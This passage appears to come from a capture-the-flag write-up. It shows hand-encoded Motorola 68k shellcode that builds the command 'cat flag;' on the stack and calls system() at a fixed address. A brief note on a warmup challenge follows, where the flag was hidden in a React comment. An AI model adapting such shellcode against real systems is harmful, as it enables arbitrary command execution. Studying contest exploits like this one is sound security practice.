\x06\x82\x66\x6c\x61\x67    ## addil #1718378855,%d2 --> 'flag'
\x2c\xc2                    ## moveal %d2,%fp@+

\xb5\x82                    ## eorl %d2,%d2
\x06\x82\x3b\x20\x20\x20    ## addil #991961120,%d2 --> ';   '
\x2c\xc2                    ## moveal %d2,%fp@+

. x4: we repeated 'cat flag;   ' to make the  
. output appear under the browser window..

\xb5\x82                    ## eorl %d2,%d2
\x2c\xc2                    ## moveal %d2,%fp@+

\x22\x0f                    ## moveal %sp,%d1
\x59\x8f                    ## subql #4,%sp
\x2e\x81                    ## moveal %d1,%sp@
\x2c\x4f                    ## moveal %sp,%fp
\x45\xf9\x05\x03\x07\xf8    ## lea 0x050307f8,%a2 --> system() address
\x4e\x92                    ## jsr %a2@
```



You Already Know
----------------
This was a simple warmup challenge. We were told that, if we could read the challenge description, we already knew the flag.
Indeed, opening Chromium's developer tools and inspecting the responses of the XHR request to retrieve the description 
in the scoreboard, the flag was hidden in plain sight inside a React comment. Really, we already knew.